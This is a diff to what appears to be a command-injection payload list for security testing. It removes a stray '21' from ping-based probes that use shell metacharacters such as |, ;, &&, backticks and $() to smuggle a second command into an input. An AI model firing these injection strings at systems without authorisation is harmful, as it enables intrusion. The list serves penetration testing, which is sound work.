@@ -37,18 +37,18 @@ $(bash -c "ping -c 21 4.2.2.2";exit)
 # If you inject these commands and you see a ping message leaving the system, 
 # then you probably have a command injection. Not all embedded system recognize the 
 # -c option, so this removes it to allow the command to run.
-|ping 21 4.2.2.2||`ping 21 4.2.2.2` #&apos; |ping 21 4.2.2.2||`ping 21 4.2.2.2` 
-|ping 21 4.2.2.2
-|`ping 21 4.2.2.2` 
-||`ping 21 4.2.2.2` 
-#\&quot; |ping 21 4.2.2.2
-#&apos; |ping 21 4.2.2.2
-&ping 21 4.2.2.2
-&&ping 21 4.2.2.2
-&`ping 21 4.2.2.2` 
-&&`ping 21 4.2.2.2` 
-`ping 21 4.2.2.2` 
-;`ping 21 4.2.2.2` 
-;ping 21 4.2.2.2
-$(bash "ping 21 4.2.2.2";exit)
-'`ping 21 4.2.2.2`'
+|ping 4.2.2.2||`ping 4.2.2.2` #&apos; |ping 4.2.2.2||`ping 4.2.2.2` 
+|ping 4.2.2.2
+|`ping 4.2.2.2` 
+||`ping 4.2.2.2` 
+#\&quot; |ping 4.2.2.2
+#&apos; |ping 4.2.2.2
+&ping 4.2.2.2
+&&ping 4.2.2.2
+&`ping 4.2.2.2` 
+&&`ping 4.2.2.2` 
+`ping 4.2.2.2` 
+;`ping 4.2.2.2` 
+;ping 4.2.2.2
+$(bash "ping 4.2.2.2";exit)
+'`ping 4.2.2.2`'
